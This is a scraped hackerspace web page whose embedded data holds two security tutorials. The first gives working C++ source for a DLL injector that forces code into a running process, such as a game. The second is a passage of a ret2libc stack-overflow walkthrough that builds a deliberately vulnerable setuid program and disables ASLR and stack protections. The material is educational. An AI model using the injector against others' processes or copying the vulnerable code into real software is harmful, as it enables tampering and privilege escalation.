41.4 24.9 50.6 11.4 5.7 62.5 15.7 58.5-11.1zm5.7 92.3c-10.3 7.4-12.9 22-5.7 32.6 7.1 10.6 21.4 13.1 32 6 10.6-7.4 13.1-22 6-32.6-7.4-10.6-21.7-13.5-32.3-6z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://www.youtube.com/c/801LabsSaltLakeCity" rel="noopener" target="_blank" title="YouTube"><span class="sr-only">YouTube</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="youtube" class="svg-inline--fa fa-youtube fa-w-18 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512"><path fill="currentColor" d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"></path></svg></a></li><li class="m-3"><a class="link--white" href="https://github.com/801labs/" rel="noopener" target="_blank" title="GitHub"><span class="sr-only">GitHub</span><svg aria-hidden="true" focusable="false" data-prefix="fab" data-icon="github" class="svg-inline--fa fa-github fa-w-16 fa-3x " role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg></a></li></ul><div class="grid grid-cols-2 lg:grid-cols-4 gap-5 mb-10"><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/about/">About</a></h2><ul class="space-y-2"><li><a class="link--white" href="/about/financial-information/">Financial Information</a></li><li><a class="link--white" href="/about/news/1/">News</a></li></ul></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/research-portal/1/">Learn</a></h2></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/get-involved/">Get Involved</a></h2><ul class="space-y-2"><li><a class="link--white" href="/get-involved/events/">Events</a></li><li><a class="link--white" href="/get-involved/location-and-hours/">Location and Hours</a></li><li><a class="link--white" href="/hackercamp/">Hackercamp</a></li></ul></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/nonprofit/">Nonprofit</a></h2></div><div><h2 class="mb-4 fluid-text-lg uppercase"><a class="link--white" href="/contact/">Contact Us</a></h2></div></div><div class="border-t border-white fluid-text-sm text-center pt-10 space-y-5"><p>Â© <!-- -->2025<!-- --> 801Labs.org. All rights reserved.</p><p><a class="link--tangerine uppercase" href="/donate/">DonateÂ &gt;</a></p><p>801 Labs hackerspace is a 501(c)(3) that is open to the public!<br/>353 East 200 South Suite #201, Salt Lake City, UT 84111</p><p><a class="link--tangerine" href="/code-of-conduct/">Code of Conduct</a><span class="mx-3">|</span><a class="link--tangerine" href="/terms/">Terms</a></p></div></div></footer></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"allTags":{"biohacking":"biohacking","buffer-overflow":"buffer overflow","development":"Development","dll-injection":"DLL Injection","domains":"domains","ee":"EE","how-to":"how to","ipv6":"IPv6","makefile":"Makefile","memory":"memory","pcap":"pcap","phishing":"phishing","re":"RE","research":"research","rfid":"RFID","story":"Story","tutorial":"Tutorial","windows-api":"Windows API","windows-hacking":"Windows Hacking"},"posts":[{"title":"DLL injection - Developing a simple injector.","slug":"developing-a-dll-injector","date_published":1549513920000,"date_updated":1562884307000,"tags":["how to","DLL Injection","Windows Hacking","Development","memory","Windows API"],"excerpt":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr \u003c\u003c \"Getting remote target process ID failed...\" \u003c\u003c std::endl;\n    return 1;\n    }\n    \n    // \u003csnipped\u003e ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr \u003c\u003c \"Acquiring a handle to the remote target process failed...\" \u003c\u003c std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr \u003c\u003c \"The given process ID is invalid, try again...\" \u003c\u003c std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout \u003c\u003c \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false \u0026\u0026 !pid_str.size());\n    \n    \tif (pid_str != \"exit\" \u0026\u0026\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout \u003c\u003c \"DLL path: \" \u003c\u003c dll_path \u003c\u003c std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr \u003c\u003c \"Specified DLL path was invalid, try again...\" \u003c\u003c std::endl;\n    \t\t}\n    \n    \t\tstd::cout \u003c\u003c \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr \u003c\u003c \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" \u003c\u003c std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout \u003c\u003c \"DLL allocation memory address: \" \u003c\u003c \u0026dll_path_in_remote_mem_addr \u003c\u003c std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout \u003c\u003c \"WriteProcessMemory was \" \u003c\u003c (write_status ? \"successful!\" : \"unsuccessful...\") \u003c\u003c std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr \u003c\u003c \"GetLastError() for failed WriteProcessMemory() call: \" \u003c\u003c GetLastError() \u003c\u003c std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    \tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr \u003c\u003c \"GetProcAddress failed...\" \u003c\u003c std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout \u003c\u003c \"LoadLibraryA address: \" \u003c\u003c \u0026load_library_addr \u003c\u003c std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr \u003c\u003c \"CreateRemoteThread failed...\" \u003c\u003c std::endl;\n    \treturn 1;\n    }\n    \n    std::cout \u003c\u003c \"Remote thread address: \" \u003c\u003c \u0026remote_thread \u003c\u003c std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr \u003c\u003c \"VirtualFreeEx failed on target process...\" \u003c\u003c std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful. Â \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -\u003e Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n","cover":"2019/07/process-explorer-test-dll-injection-success.png","author":{"name":"th3v0id","avatar":"avatars/th3v0id.jpg"},"content":"\n[DLL injection](https://en.wikipedia.org/wiki/DLL_injection) is the process of forcing a running process to load a DLL (Dynamically Linked Library) of your choice. In this write-up, I'll walk you through the LoadLibraryA injection method. This causes the DLL to be loaded into the context of the process thus allowing us to execute our own code inside of the process's virtual memory space.\n\n\tI assume there is a base understanding of what a DLL is. By the end of this write-up, we'll have a functional DLL injector along with a bare-bone test DLL which we'll use for testing during development.\n\n\tWriting a DLL injector is pretty trivial and only requires a handful steps. Remember that DLLs are specific to Windows and there-for we'll be utilizing functions provided to us by the Windows API. The steps required for the task at hand are in order as follows:\n\n1. Acquire a handle to the remote process that you want to inject / load your DLL into. We do this by prompting for a process ID (PID) after displaying a list of processes w/ their PIDs.\n\n\n    // Get the remote target pid\n    uint16_t target_pid = get_target_pid();\n    \n    if (!target_pid) {\n    std::cerr \u003c\u003c \"Getting remote target process ID failed...\" \u003c\u003c std::endl;\n    return 1;\n    }\n    \n    // \u003csnipped\u003e ...\n    \n    // Obtain a handle to the target remote process.\n    HANDLE target_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);\n    \n    \n    if (target_process == NULL) {\n        std::cerr \u003c\u003c \"Acquiring a handle to the remote target process failed...\" \u003c\u003c std::endl;\n        return -1;\n    }\n\n*get_target_pid() function:*\n\n    \n    uint16_t get_target_pid() {\n    \tuint16_t pid = 0;\n    \t\n    \tstd::string pid_str;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr \u003c\u003c \"The given process ID is invalid, try again...\" \u003c\u003c std::endl;\n    \t\t}\n    \n    \t\tprint_process_list();\n    \n    \t\tstd::cout \u003c\u003c \"\\nEnter target process ID: \";\n    \t\tstd::getline(std::cin, pid_str);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (pid_str == \"exit\" ||\n    \t\t\tpid_str == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(pid_str) == false \u0026\u0026 !pid_str.size());\n    \n    \tif (pid_str != \"exit\" \u0026\u0026\n    \t\tpid_str != \"quit\") {\n    \t\tpid = (uint16_t)std::stoi(pid_str);\n    \t}\n    \n    \treturn pid;\n    }\n\n2. Create and store the DLL's absolute path in a variable.\n\n\n    // Get the dll's path that we want to inject into our remote target process.\n    std::string dll_path = get_dll_path();\n    \n    std::cout \u003c\u003c \"DLL path: \" \u003c\u003c dll_path \u003c\u003c std::endl;\n\n*get_dll_path() function:*\n\n    std::string get_dll_path() {\n    \n    \tstd::string dll_path;\n    \tbool first_input_entered = false;\n    \n    \tdo {\n    \t\tif (first_input_entered) {\n    \t\t\tsystem(\"cls\");\n    \t\t\tprint_banner();\n    \t\t\tstd::cerr \u003c\u003c \"Specified DLL path was invalid, try again...\" \u003c\u003c std::endl;\n    \t\t}\n    \n    \t\tstd::cout \u003c\u003c \"Enter path to DLL: \";\n    \t\tstd::getline(std::cin, dll_path);\n    \n    \t\tif (first_input_entered == false) {\n    \t\t\tfirst_input_entered = true;\n    \t\t}\n    \n    \t\tif (dll_path == \"exit\" ||\n    \t\t\tdll_path == \"quit\") {\n    \t\t\tbreak;\n    \t\t}\n    \n    \t} while (file_exists(dll_path) == false);\n    \n    \treturn dll_path;\n    }\n\n3. Now we need to allocate enough space in the remote process to store the DLLs absolute path. We achieve this by using Window's [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex) function.\n\n\n    // Allocate space for our DLL path inside the target remote process.\n    LPVOID dll_path_in_remote_mem_addr = VirtualAllocEx(\n    \ttarget_process,\n    \tNULL,\n    \t_MAX_PATH,\n    \tMEM_RESERVE | MEM_COMMIT,\n    \tPAGE_EXECUTE_READWRITE\n    );\n    \n    if (dll_path_in_remote_mem_addr == NULL) {\n    \tstd::cerr \u003c\u003c \"Allocating space for our DLL path in the remote target process's virtual memory space failed...\" \u003c\u003c std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout \u003c\u003c \"DLL allocation memory address: \" \u003c\u003c \u0026dll_path_in_remote_mem_addr \u003c\u003c std::endl;\n\n4. And now that we've allocated and reserved enough memory for the DLL path, we can write it into that region of memory of the remote process using the Window's [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory) function. \n\n\n    // Copy the DLL path into the allocated memory region.\n    bool write_status = WriteProcessMemory(\n    \ttarget_process,\n    \tdll_path_in_remote_mem_addr,\n    \tdll_path.c_str(),\n    \tstrlen(dll_path.c_str()),\n    \tNULL\n    );\n    \n    std::cout \u003c\u003c \"WriteProcessMemory was \" \u003c\u003c (write_status ? \"successful!\" : \"unsuccessful...\") \u003c\u003c std::endl;;\n    \n    if (!write_status) {\n    \tstd::cerr \u003c\u003c \"GetLastError() for failed WriteProcessMemory() call: \" \u003c\u003c GetLastError() \u003c\u003c std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n\n5. Next, we'll need to obtain the address to the Window's [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) function. This is easily done through the Window's [GetProcAddress](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-getprocaddress) function.\n\n\n    // Get the address to the LoadLibraryA Windows API function.\n    LPVOID load_library_addr = (LPVOID)GetProcAddress(\n    \tGetModuleHandle(\"kernel32.dll\"),\n    \t\"LoadLibraryA\"\n    );\n    \n    if (load_library_addr == NULL) {\n    \tstd::cerr \u003c\u003c \"GetProcAddress failed...\" \u003c\u003c std::endl;\n    \tCloseHandle(target_process);\n    \treturn 1;\n    }\n    \n    std::cout \u003c\u003c \"LoadLibraryA address: \" \u003c\u003c \u0026load_library_addr \u003c\u003c std::endl;\n\n6. Create a remote thread via [CreateRemoteThread](https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread) and pass the handle we have on the remote process, the address to LoadLibraryA, and the memory address that our DLL path resides at. LoadLibraryA will be invoked and passed `dll_path_in_remote_mem_addr` by our call to CreateRemoteThread. This is where the magic happens and our DLL is loaded into the process.\n\n\n    // Create our remote thread for running our DLL code.\n    HANDLE remote_thread = CreateRemoteThread(\n    \ttarget_process,\n    \tNULL,\n    \tNULL,\n    \t(LPTHREAD_START_ROUTINE)load_library_addr,\n    \tdll_path_in_remote_mem_addr,\n    \tNULL,\n    \tNULL\n    );\n    \n    if (remote_thread == NULL) {\n    \tstd::cerr \u003c\u003c \"CreateRemoteThread failed...\" \u003c\u003c std::endl;\n    \treturn 1;\n    }\n    \n    std::cout \u003c\u003c \"Remote thread address: \" \u003c\u003c \u0026remote_thread \u003c\u003c std::endl;\n\n7. The last thing we do is deallocate the memory that was reserved for our DLL path using [VirtualFreeEx](https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualfreeex) and then close our open handles using [CloseHandle](https://docs.microsoft.com/en-us/windows/desktop/api/handleapi/nf-handleapi-closehandle).\n\n\n    // Release the allocated memory we acquired from the remote process.\n    if (VirtualFreeEx(target_process, dll_path_in_remote_mem_addr, 0, MEM_RELEASE) == 0) {\n    \tstd::cerr \u003c\u003c \"VirtualFreeEx failed on target process...\" \u003c\u003c std::endl;\n    }\n    \n    // Free our handle on the remote thread\n    CloseHandle(remote_thread);\n    \n    // Free our handle on the remote process\n    CloseHandle(target_process);\n\nTying our code together and testing it out ~ we run `.\\InjectDLL.exe`, then enter the remote target PID, and finally the absolute path to `TestDLL.dll`. Our executable outputs some information about the injection indicating it was successful. Â \n\n![](2019/07/2019-05-02-090559_3440x1440_scrot.png \"Successful execution of our DLL injector\")\n\nOur injector indicated it was successful, but we can double check with Window's [Process Explorer](https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer). After installing it (if you don't have it installed already) we launch it, make sure the lower pane is visible by toggling it on. This can be achieved by checking the `View -\u003e Show Lower Pane` option. Then, select the remote target process in the list and press the key combination `Ctrl + d`. You should now see a list of loaded DLLs. One of which is our DLL! \n\n![](2019/07/process-explorer-test-dll-injection-success.png \"Using Process Explorer, we can see that our TestDLL.dll file was injected into Game.exe successfully.\")\n\nOnce we have successfully loaded our DLL into the target process, we can access and reference anything within it's virtual memory space. In part 2, I'll demonstrate an example use case of DLL injection by showing how we can find an in-memory data structure (i.e. the offset to a player structure / class in a game).\n\nThe full source code for both the DLL injector and the Test DLL can be found in this [Github](https://github.com/selftaught/DLLinjector) repository.\n\nThanks for reading through this article! If you notice any issues in the write-up or code - please don't hesitate to message me! You can do so via [keybase](https://keybase.io/th3v0id) or [twitter](https://twitter.com/x74x76).\n"},{"title":"Exploiting a Stack Buffer Overflow (ret2libc method)","slug":"stack-exploitation","date_published":1547813100000,"date_updated":1547814692000,"tags":["research","memory","how to","buffer overflow"],"excerpt":"\nA stack buffer overflow occurs when a program writes to a memory address on it's call stack outside of the intended structure / space.\n\nIn this walk-through, I'm going to cover the ret2libc (return-to-libc) method. This method of exploitation is great because it doesn't require the use of your typical shellcode. It involves making sys calls to the functions provided to us by libc (standard c library). We're going to use the `system` and `exit` sys calls for demonstration.\n\nTo have a good understanding about how stack overflows work, it's extremely helpful to know how stack data structures work, and more importantly - how the call stack works. For the sake of time, I'm not going to type out how these two things work in great detail. If you want to know how these work, I would recommend watching [stack](https://www.youtube.com/watch?v=7dLZRMDcY6c) and [call stack](https://www.youtube.com/watch?v=XbZQ-EonR_I).\n\n## Creating a vulnerable binary to test on\n\nTo practice carrying out a SOF, we create a vulnerable binary. The source below uses strcpy with no boundary checking. This is what makes the code vulnerable to a stack overflow attack. strcpy() will take whatever is in argv[1] and copy it into buf. Without boundary checking around strcpy() to make sure the length of argv[1] isn't greater than the width of the buffer, we can overrun the buffer and overwrite assembler instructions with our own.\n\n    #include \u003cstring.h\u003e\n    #include \u003cunistd.h\u003e\n    #include \u003csys/cdefs.h\u003e\n    \n    int main(int argc, char** argv) {\n    \n        setuid(0);\n    \n        if (argc \u003e 1) {\n            char buf[256];\n            strcpy(buf, argv[1]);\n        }\n    \n        return 0;\n    }\n    \n\nFor the sake of simplicity and keeping this article to a sane length, I disable common buffer overflow protection (BOP) mechanisms including ASLR, Canaries, and NX bit. PIE and RelRO are disabled on my system by default. I also pass an option along to make the binary 32-bit.\n\n`gcc -g -Wall -mpreferred-stack-boundary=2 -fno-stack-protector -m32 -I. -z execstack -o bin/sof src/sof.c`\n\n- `-g`: Produces debugging information about the program that GDB (GNU Debugger) can use to aid us.\n- `-fno-stack-protector`: Disables stack smashing protectors (SSP).\n- `-z execstack`: Makes stack frames executable.\n- `-o sof`: Output (compiled) binary name will be sof.\n- `-mpreferred-stack-boundary=2`: aligns the stack boundary in our binary to 4 bytes.\n\nASLR can't be disabled via a compiler flag because it's a feature that's carried out and managed by the kernel. On Fedora, Debian, and Ubuntu, ASLR can be disabled by adding `kernel.randomize_va_space = 0` to `/etc/sysctl.conf` or `echo 0 \u003e /proc/sys/kernel/randomize_va_space`. Other linux distributions may require a different approach. An easy way to determine if ASLR is enabled (it likely is if you didn't expliclity disable it) is to `cat /proc/sys/kernel/randomize_va_space`. If the output is a positive number, it's enabled.\n\n## Assembler dump breakdown\n\nLet's disassemble the main function in our binary, break it down, and talk about what happens at an assembler level.\n\n    th3v0id@lenovo:~/repos/bufferoverflows/stack/01|master \n    â  gdb -q \tbin/sof                                              \n    [*] No debugging session active\n    GEF for linux ready, type `gef' to start, `gef config' to configure\n    67 commands loaded for GDB Fedora 8.0.1-33.fc27 using Python engine 3.6\n    Reading symbols from bin/sof...done.\n    @gefâ¤  disassemble main\n    Dump of assembler code for function main:\n       0x08048416 \u003c+0\u003e:\tpush   ebp\n       0x08048417 \u003c+1\u003e:\tmov    ebp,esp\n       0x08048419 \u003c+3\u003e:\tsub    esp,0x100\n       0x0804841f \u003c+9\u003e:\tpush   0x0\n       0x08048421 \u003c+11\u003e:\tcall   0x8048300 \u003csetuid@plt\u003e\n       0x08048426 \u003c+16\u003e:\tadd    esp,0x4\n       0x08048429 \u003c+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d \u003c+23\u003e:\tjle    0x8048447 \u003cmain+49\u003e\n       0x0804842f \u003c+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 \u003c+28\u003e:\tadd    eax,0x4\n       0x08048435 \u003c+31\u003e:\tmov    eax,DWORD PTR [eax]\n       0x08048437 \u003c+33\u003e:\tpush   eax\n       0x08048438 \u003c+34\u003e:\tlea    eax,[ebp-0x100]\n       0x0804843e \u003c+40\u003e:\tpush   eax\n       0x0804843f \u003c+41\u003e:\tcall   0x80482e0 \u003cstrcpy@plt\u003e\n       0x08048444 \u003c+46\u003e:\tadd    esp,0x8\n       0x08048447 \u003c+49\u003e:\tmov    eax,0x0\n       0x0804844c \u003c+54\u003e:\tleave  \n       0x0804844d \u003c+55\u003e:\tret    \n    End of assembler dump.\n    @gefâ¤  q\n    \n\n       0x08048416 \u003c+0\u003e:\tpush   ebp\n       0x08048417 \u003c+1\u003e:\tmov    ebp,esp\n       0x08048419 \u003c+3\u003e:\tsub    esp,0x100\n    \n\nThese first few lines above are called a function prologue. `push ebp` pushes our base pointer onto the stack. Then `mov ebp,esp` copies the value of `esp` (stack pointer) into the `ebp` register making `ebp` == `esp`. Next, `sub esp,0x100` moves the stack pointer 256 bytes (0x100 hex = 256) towards a lower memory address, reserving 256 bytes of data on the stack. This is space being reserved for `char buf[256]`.\n\n       0x0804841f \u003c+9\u003e:\tpush   0x0\n       0x08048421 \u003c+11\u003e:\tcall   0x8048300 \u003csetuid@plt\u003e\n    \n\nPush 0 onto the stack as an argument for the call to `setuid()`.\n\n       0x08048426 \u003c+16\u003e:\tadd    esp,0x4\n       0x08048429 \u003c+19\u003e:\tcmp    DWORD PTR [ebp+0x8],0x1\n       0x0804842d \u003c+23\u003e:\tjle    0x8048447 \u003cmain+49\u003e\n    \n\nThe next instruction `cmp DWORD PTR [ebp+0x8],0x1` compares the first argument of main (argc) to 1. The following `jle` instruction uses the result of this comparison. It takes the result and jumps to `\u003cmain+39\u003e` if the result is less than or equal to the value stored at `0x8048412`, which is 1. If you look at the C source above, you can see this is essentially our `if (argc \u003e) {...}` condition.\n\n       0x0804842f \u003c+25\u003e:\tmov    eax,DWORD PTR [ebp+0xc]\n       0x08048432 \u003c+28\u003e:\tadd    eax,0x4\n       0x08048435 \u003c+31\u003e:\tmov    eax,DWORD PTR [eax]\n       0x08048437 \u003c+33\u003e:\tpush   eax\n    \n\nHere, we move the address stored at ebp+0xc into the eax register (this is the address to element 0 of argv). Then, we add 4 